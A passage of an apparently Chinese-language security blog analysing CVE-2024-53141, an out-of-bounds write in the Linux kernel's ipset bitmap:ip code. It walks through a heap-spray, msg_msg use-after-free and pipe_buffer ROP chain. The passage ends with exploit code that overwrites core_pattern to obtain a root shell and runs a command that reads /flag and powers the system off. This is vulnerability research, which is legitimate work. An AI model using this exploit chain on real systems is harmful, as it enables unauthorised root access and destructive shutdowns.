ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP], &amp;ip);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (ip &lt; <span class="built_in">map</span>-&gt;first_ip || ip &gt; <span class="built_in">map</span>-&gt;last_ip) <span class="comment">// [4]</span></span><br><span class="line">        <span class="keyword">return</span> -IPSET_ERR_BITMAP_RANGE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tb[IPSET_ATTR_IP_TO]) &#123;</span><br><span class="line">        ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP_TO], &amp;ip_to);</span><br><span class="line">        <span class="keyword">if</span> (ip &gt; ip_to) &#123;</span><br><span class="line">            swap(ip, ip_to);</span><br><span class="line">            <span class="keyword">if</span> (ip &lt; <span class="built_in">map</span>-&gt;first_ip) <span class="comment">// [5]</span></span><br><span class="line">                <span class="keyword">return</span> -IPSET_ERR_BITMAP_RANGE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tb[IPSET_ATTR_CIDR]) &#123;</span><br><span class="line">        u8 cidr = nla_get_u8(tb[IPSET_ATTR_CIDR]);</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        ip_set_mask_from_to(ip, ip_to, cidr); <span class="comment">// [6]</span></span><br><span class="line">    &#125; <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ip_to &gt; <span class="built_in">map</span>-&gt;last_ip) <span class="comment">// [7]</span></span><br><span class="line">        <span class="keyword">return</span> -IPSET_ERR_BITMAP_RANGE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; !before(ip_to, ip); ip += <span class="built_in">map</span>-&gt;hosts) &#123;</span><br><span class="line">        e.id = ip_to_id(<span class="built_in">map</span>, ip);</span><br><span class="line">        ret = adtfn(<span class="built_in">set</span>, &amp;e, &amp;ext, &amp;ext, flags); <span class="comment">// [8]</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bitmap_ip_adt_elem</span> &#123;</span></span><br><span class="line">	u16 id;</span><br><span class="line">&#125;;	</span><br><span class="line"><span class="type">static</span> u32</span><br><span class="line"><span class="title function_">ip_to_id</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> bitmap_ip *m, u32 ip)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ((ip &amp; ip_set_hostmask(m-&gt;netmask)) - m-&gt;first_ip) / m-&gt;hosts;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 bitmap:ip 类型的元素添加逻辑中，bitmap_ip_uadt 函数通过解析用户传入的 IP、IP_TO 或 CIDR 参数，动态生成目标 IP 地址段并进行边界校验。当用户指定 CIDR 格式时，内核通过 ip_set_mask_from_to 宏将 CIDR 掩码转换为连续 IP 范围，该宏以网络序对起始 IP（ip）进行掩码截断，生成规范化的起止地址（如 192.168.1.0&#x2F;24 将生成 ip&#x3D;192.168.1.0，ip_to&#x3D;192.168.1.255）。然而，在后续校验流程中，代码仅通过 ip_to &gt; map-&gt;last_ip 检查终止地址是否超出集合预定义的全局边界（map-&gt;last_ip），却未对规范化后的起始地址 ip 执行下限校验（如 ip &lt; map-&gt;first_ip）。这种单向校验的缺陷使得攻击者可通过构造特定的 CIDR 参数，使 ip_set_mask_from_to 计算出的 ip 远小于 map-&gt;first_ip，而 ip_to 恰好落在合法范围内。此时，ip_to_id 函数将基于越界的 ip 计算出负值的逻辑 ID，但由于返回值类型（u32）与结构体成员类型（u16）不匹配，构造好的整数转换会变成越界的正整数，从而实现越界写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">mtype_add</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="type">void</span> *value, <span class="type">const</span> <span class="keyword">struct</span> ip_set_ext *ext,</span></span><br><span class="line"><span class="params">      <span class="keyword">struct</span> ip_set_ext *mext, u32 flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    set_bit(e-&gt;id, <span class="built_in">map</span>-&gt;members); <span class="comment">// [9]</span></span><br><span class="line">    <span class="built_in">set</span>-&gt;elements++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 mtype_add 函数中，内核通过 set_bit(e-&gt;id, map-&gt;members) 将目标 IP 地址经 ip_to_id 转换后的数值型 ID 映射到位图（map-&gt;members）的对应比特位，通过置位操作标记该 IP 的存在性，此过程若因 e-&gt;id 超出 map-&gt;members 预分配范围（如 CIDR 漏洞导致 ID 计算为超大值），将引发位图内存的越界写操作，直接篡改相邻内核数据结构，构成提权攻击的原子操作点。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ext_comment(e, s)	\</span></span><br><span class="line"><span class="meta">((struct ip_set_comment *)(((void *)(e)) + (s)-&gt;offset[IPSET_EXT_ID_COMMENT]))</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_set_comment</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ip_set_comment_rcu</span> __<span class="title">rcu</span> *<span class="title">c</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ip_set_init_comment</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> ip_set_comment *comment,</span></span><br><span class="line"><span class="params">		    <span class="type">const</span> <span class="keyword">struct</span> ip_set_ext *ext)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ip_set_comment_rcu</span> *<span class="title">c</span> =</span> rcu_dereference_protected(comment-&gt;c, <span class="number">1</span>);</span><br><span class="line">	<span class="type">size_t</span> len = ext-&gt;comment ? <span class="built_in">strlen</span>(ext-&gt;comment) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(c)) &#123;</span><br><span class="line">		<span class="built_in">set</span>-&gt;ext_size -= <span class="keyword">sizeof</span>(*c) + <span class="built_in">strlen</span>(c-&gt;str) + <span class="number">1</span>;</span><br><span class="line">		kfree_rcu(c, rcu);</span><br><span class="line">		rcu_assign_pointer(comment-&gt;c, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!len)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(len &gt; IPSET_MAX_COMMENT_SIZE))</span><br><span class="line">		len = IPSET_MAX_COMMENT_SIZE;</span><br><span class="line">	c = kmalloc(<span class="keyword">sizeof</span>(*c) + len + <span class="number">1</span>, GFP_ATOMIC);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!c))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	strscpy(c-&gt;str, ext-&gt;comment, len + <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">set</span>-&gt;ext_size += <span class="keyword">sizeof</span>(*c) + <span class="built_in">strlen</span>(c-&gt;str) + <span class="number">1</span>;</span><br><span class="line">	rcu_assign_pointer(comment-&gt;c, c);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(ip_set_init_comment);</span><br></pre></td></tr></table></figure>

<p>​	在 IP 集合的 comment 扩展机制中，当用户为集合元素附加描述信息时，内核通过 ip_set_init_comment 函数动态管理注释内存：若该元素已存在注释（comment-&gt;c 非空），则通过 RCU 机制异步释放旧内存（kfree_rcu）并递减集合扩展数据尺寸（ext_size）；随后根据用户输入的注释字符串长度（上限为 IPSET_MAX_COMMENT_SIZE），以 GFP_ATOMIC 标志在原子上下文中分配 ip_set_comment_rcu 结构体内存（16 字节头部 + 字符串空间），使用安全拷贝函数 strscpy 将用户态数据写入内核缓冲区，最后通过 rcu_assign_pointer 原子更新注释指针并扩展 ext_size。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">ip_set_init_counter</span><span class="params">(<span class="keyword">struct</span> ip_set_counter *counter,</span></span><br><span class="line"><span class="params">		    <span class="type">const</span> <span class="keyword">struct</span> ip_set_ext *ext)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (ext-&gt;bytes != ULLONG_MAX)</span><br><span class="line">		atomic64_set(&amp;(counter)-&gt;bytes, (<span class="type">long</span> <span class="type">long</span>)(ext-&gt;bytes));</span><br><span class="line">	<span class="keyword">if</span> (ext-&gt;packets != ULLONG_MAX)</span><br><span class="line">		atomic64_set(&amp;(counter)-&gt;packets, (<span class="type">long</span> <span class="type">long</span>)(ext-&gt;packets));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 IP 集合的 counter 扩展机制中，内核通过原子操作实现对网络流量的精细化统计。当用户态指定 bytes 和 packets 初始值时（默认值为 ULLONG_MAX 表示不初始化），ip_set_init_counter 函数会以原子方式将用户提供的 64 位无符号整数值通过类型转换（long long）写入 atomic64_t 类型的计数器结构体成员。这种设计通过 atomic64_set 确保多核环境下流量统计的原子性更新，同时允许动态配置初始统计基数（如重置计数器场景）。这里的两个指针bytes和packets可以通过用户态传入，这样就可以控制指定位置写两个指针。</p>
<h1 id="二-漏洞成因"><a href="#二-漏洞成因" class="headerlink" title="二.漏洞成因"></a>二.漏洞成因</h1><p>​	对于漏洞具体利用，可以利用下述方式可以实现最终的攻击效果。</p>
<h3 id="2-1-泄露出内核堆地址"><a href="#2-1-泄露出内核堆地址" class="headerlink" title="2.1 泄露出内核堆地址"></a>2.1 泄露出内核堆地址</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bitmap_ip_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> nlattr *tb[],</span></span><br><span class="line"><span class="params">        u32 flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bitmap_ip</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="built_in">set</span>-&gt;dsize = ip_set_elem_len(<span class="built_in">set</span>, tb, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 0x8, comment length</span></span><br><span class="line">    <span class="built_in">map</span> = ip_set_alloc(<span class="keyword">sizeof</span>(*<span class="built_in">map</span>) + elements * <span class="built_in">set</span>-&gt;dsize); <span class="comment">// 0x58 + 0x8 * 53 == 512, kmalloc-cg-512</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">init_map_ip</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> bitmap_ip *<span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">        u32 first_ip, u32 last_ip,</span></span><br><span class="line"><span class="params">        u32 elements, u32 hosts, u8 netmask)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">map</span>-&gt;members = bitmap_zalloc(elements, GFP_KERNEL | __GFP_NOWARN); <span class="comment">// 8, kmalloc-8</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	首先就是可以重新看一下bitmap_ip_create的代码，再最开始创建bitmap的时候之前也说过，会根据不同的扩展类型定义不同的set-&gt;dsize，这里对于comment模式来说set-&gt;dsize为8，这样分配出来的map也就是计算出来恰好是512个字节的长度，可以分配kmalloc-cg-512的object。通过上述的gdb调试信息我们也可以清晰的看到对应bitmap的详细结构，其中我们需要关注的就是members也就是bitmap的内容，以及最终扩展的指针。</p>
<p><img src="/images/CVE-2024-53141/1742260034819.jpg" alt="1742260034819"></p>
<p><img src="/images/CVE-2024-53141/1742260081534.jpg" alt="1742260081534"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u32</span><br><span class="line"><span class="title function_">ip_to_id</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> bitmap_ip *m, u32 ip)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ((ip <span class="comment">/* 0xe0000000 */</span> &amp; ip_set_hostmask(m-&gt;netmask) <span class="comment">/* 0xffffffff */</span>) - m-&gt;first_ip <span class="comment">/* 0xffffffcb */</span>) / m-&gt;hosts <span class="comment">/* 1 */</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后便是对于如何通过设置 0xffffffcb (first_ip)， 0xffffffff (last_ip)实现出现越界的写，这里当我们利用CIDR为3进行配置的时候，我们ip就被更新为0xe0000000，通过上述ip_to_id的计算，就可以获得到id的值为0xe0000035，但是之前原理用也有分析，bitmap_ip_adt_elem结构体的id实际上是一个u16的类型，经过阶段之后就是0x35，相当于ip对应的id被认为是0x35，其实这里id就已经指向的是下一个object了。因为之前分配的内存是0x35个dsize，第0x35指针指向的就是下一个object</p>
<p><img src="/images/CVE-2024-53141/1742261583103.jpg" alt="1742261583103"></p>
<p><img src="/images/CVE-2024-53141/1742261699346.jpg" alt="1742261699346"></p>
<p>​	这里截图实际上是对于bitmap的内存进行介绍，这里0xffe实际上就是因为0x35指向的是第53个bit，之后会循环的设置bitmap，并且对于对应id的内存写一个kmalloc-cg-192的comment指针。</p>
<p><img src="/images/CVE-2024-53141/1742261755154.jpg" alt="1742261755154"></p>
<p>​	这里借用一下之前提供链接的图片，可以更加可视化的看出之前讲述的内容，通过覆盖comment指针到下一个object，并且再bitmap前后利用skb_buff进行堆喷，可以将这个指针写道skb_buff的区域，最终可以读取这里的指针地址。</p>
<h3 id="2-2-防止越界写导致程序崩溃"><a href="#2-2-防止越界写导致程序崩溃" class="headerlink" title="2.2 防止越界写导致程序崩溃"></a>2.2 防止越界写导致程序崩溃</h3><p>​	经过上述的攻击，我们就可以获取到一个指向kmalloc-cg-192的指针，但是如果没有设置结束条件的话，会出现一直写指针地址，直到把所有ip都写完（0xe0000000这些无类域间路由全部添加），因此我们再bitmap的起始位置加入ip，使其标注为1，刚才仔细关注gdb调试截图的时候就可以发现这个现象，这样当我们更新到下一个Bitmap的时候就会发现这里已经添加了，就会直接返回停止更新。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bitmap_ip_do_add</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> bitmap_ip_adt_elem *e, <span class="keyword">struct</span> bitmap_ip *<span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">         u32 flags, <span class="type">size_t</span> dsize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> !!test_bit(e-&gt;id, <span class="built_in">map</span>-&gt;members); <span class="comment">// [2]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">mtype_add</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="type">void</span> *value, <span class="type">const</span> <span class="keyword">struct</span> ip_set_ext *ext,</span></span><br><span class="line"><span class="params">      <span class="keyword">struct</span> ip_set_ext *mext, u32 flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mtype</span> *<span class="title">map</span> =</span> <span class="built_in">set</span>-&gt;data;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">mtype_adt_elem</span> *<span class="title">e</span> =</span> value;</span><br><span class="line">    <span class="type">int</span> ret = mtype_do_add(e, <span class="built_in">map</span>, flags, <span class="built_in">set</span>-&gt;dsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == IPSET_ADD_FAILED <span class="comment">/* 1 */</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!(flags &amp; IPSET_FLAG_EXIST)) &#123;</span><br><span class="line">            set_bit(e-&gt;id, <span class="built_in">map</span>-&gt;members);</span><br><span class="line">            <span class="keyword">return</span> -IPSET_ERR_EXIST; <span class="comment">// [3]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/CVE-2024-53141/1742262046593.jpg" alt="1742262046593"></p>
<h3 id="2-3-UAF漏洞利用"><a href="#2-3-UAF漏洞利用" class="headerlink" title="2.3 UAF漏洞利用"></a>2.3 UAF漏洞利用</h3><p>​	到了这一步实际上就是攻击利用的关键点，如何利用现有已知的堆地址实现UAF，这里我们可以想到msg_msg结构体，这里我也说一下为什么这样构造（下面的图都是借鉴别人的），对于第一步堆喷skb_buff之后泄露堆地址主要是因为skb_buff的结构体信息<strong>skb_shared_info</strong>实际上存储到object的最后部分，因此我们再object的头部写堆地址并不会导致程序崩溃，而这里再UAF的时候利用msg_msg是因为<strong>msg_msgseg</strong>的next指针是存储到结构体的头部，因此我们只要覆盖一个指针的内容就可以控制msg_msg链，最终删除的时候可以将指定的堆地址一同free。</p>
<p><img src="/images/CVE-2024-53141/1742266065592.jpg" alt="1742266065592"></p>
<p><img src="/images/CVE-2024-53141/1742265989434.jpg" alt="1742265989434"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"> <span class="title function_">ip_set_init_counter</span><span class="params">(<span class="keyword">struct</span> ip_set_counter *counter,</span></span><br><span class="line"><span class="params">             <span class="type">const</span> <span class="keyword">struct</span> ip_set_ext *ext)</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (ext-&gt;bytes != ULLONG_MAX)</span><br><span class="line">         atomic64_set(&amp;(counter)-&gt;bytes, (<span class="type">long</span> <span class="type">long</span>)(ext-&gt;bytes));</span><br><span class="line">     <span class="keyword">if</span> (ext-&gt;packets != ULLONG_MAX)</span><br><span class="line">         atomic64_set(&amp;(counter)-&gt;packets, (<span class="type">long</span> <span class="type">long</span>)(ext-&gt;packets));</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"> <span class="title function_">bitmap_ip_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> nlattr *tb[],</span></span><br><span class="line"><span class="params">         u32 flags)</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">bitmap_ip</span> *<span class="title">map</span>;</span></span><br><span class="line">     <span class="comment">// [...]</span></span><br><span class="line">     <span class="built_in">set</span>-&gt;dsize = ip_set_elem_len(<span class="built_in">set</span>, tb, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 0x10, counter length</span></span><br><span class="line">     <span class="built_in">map</span> = ip_set_alloc(<span class="keyword">sizeof</span>(*<span class="built_in">map</span>) + elements * <span class="built_in">set</span>-&gt;dsize); <span class="comment">// 0x58 + 0x10 * 64 == 1112, kmalloc-cg-2k</span></span><br><span class="line">     <span class="comment">// [...]</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>​	对于越界写实际上利用的就是Counter类型，这里之前再介绍部分也有讲述，实际上这里set-&gt;dsize的值是0x10，也就是存储用户态传递过来的两个指针，这里创建的map大小是1112，也是分配kmalloc-cg-2k的object，之后再这个Object前后进行堆喷，这样通过越界写指针就可以覆盖msg_msgseg的Next指针，这样就可以再free的时候一同free指向的object。这里需要注意next指向的内存区域实际上是kmalloc-cg-1k的object，和最开始的skb_buff不是一个，为了增加对于猜测成功率，我们可以再最开始进行堆喷kmalloc-cg-1k的object。</p>
<p><img src="/images/CVE-2024-53141/1742266615726.jpg" alt="1742266615726"></p>
<p><img src="/images/CVE-2024-53141/1742266623700.jpg" alt="1742266623700"></p>
<p>​	上图实际上就是对于漏洞利用前后的状态，最终就可以实现UAF漏洞，对于skb_buff删除，后面的利用原理就十分简单了，我们只需要继续堆喷pipe_buffer，之后分配到UAF的skb_buff，并且覆盖函数指针，最终就可以实现rop链。</p>
<h1 id="三-exp利用原理分析"><a href="#三-exp利用原理分析" class="headerlink" title="三.exp利用原理分析"></a>三.exp利用原理分析</h1><p>​	首先对于官方提供的exp来说，是通过利用上述的越界写，通过skb_buff获取堆指针的值，之后利用覆盖msg_seg的next指针，使其指向目标的skb_buff的object，通过释放msg_msg结构体就可以将skb_buff释放形成uaf，最终利用堆喷pipe_buffer，使得可以利用篡改函数指针最终实现rop链子执行，接下来我们就通过exp的流程对于漏洞具体利用进行阐述</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Check if /proc/sys/kernel/core_pattern has been overwritten</span></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">	<span class="type">int</span> core = open(<span class="string">&quot;/proc/sys/kernel/core_pattern&quot;</span>, O_RDONLY);</span><br><span class="line">	read(core, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">	close(core);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(buf, <span class="string">&quot;|/proc/%P/fd/666&quot;</span>, <span class="number">0x10</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">crash</span><span class="params">(<span class="type">char</span> *cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> memfd = memfd_create(<span class="string">&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	SYSCHK(sendfile(memfd, open(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="number">0</span>), <span class="number">0</span>, <span class="number">0xffffffff</span>));</span><br><span class="line">	dup2(memfd, <span class="number">666</span>);</span><br><span class="line">	close(memfd);</span><br><span class="line">	<span class="keyword">while</span> (check_core() == <span class="number">0</span>)</span><br><span class="line">		usleep(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Root shell !!&quot;</span>);</span><br><span class="line">	<span class="comment">/* Trigger program crash and cause kernel to executes program from core_pattern which is our &quot;root&quot; binary */</span></span><br><span class="line">	*(<span class="type">size_t</span> *)<span class="number">0</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// #define SYS_pidfd_getfd 438</span></span><br><span class="line">		<span class="type">int</span> pid = strtoull(argv[<span class="number">1</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">		<span class="type">int</span> pfd = syscall(SYS_pidfd_open, pid, <span class="number">0</span>);</span><br><span class="line">		<span class="type">int</span> stdinfd = syscall(SYS_pidfd_getfd, pfd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="type">int</span> stdoutfd = syscall(SYS_pidfd_getfd, pfd, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="type">int</span> stderrfd = syscall(SYS_pidfd_getfd, pfd, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">		dup2(stdinfd, <span class="number">0</span>);</span><br><span class="line">		dup2(stdoutfd, <span class="number">1</span>);</span><br><span class="line">		dup2(stderrfd, <span class="number">2</span>);</span><br><span class="line">		<span class="comment">/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/</span></span><br><span class="line">		system(<span class="string">&quot;cat /flag;echo o&gt;/proc/sysrq-trigger&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (fork() == <span class="number">0</span>) <span class="comment">// this process is used to trigger core_pattern exploit</span></span><br><span class="line">	&#123;</span><br><span class="line">		set_cpu(<span class="number">0</span>);</span><br><span class="line">		setsid();</span><br><span class="line">		crash(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	set_cpu(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

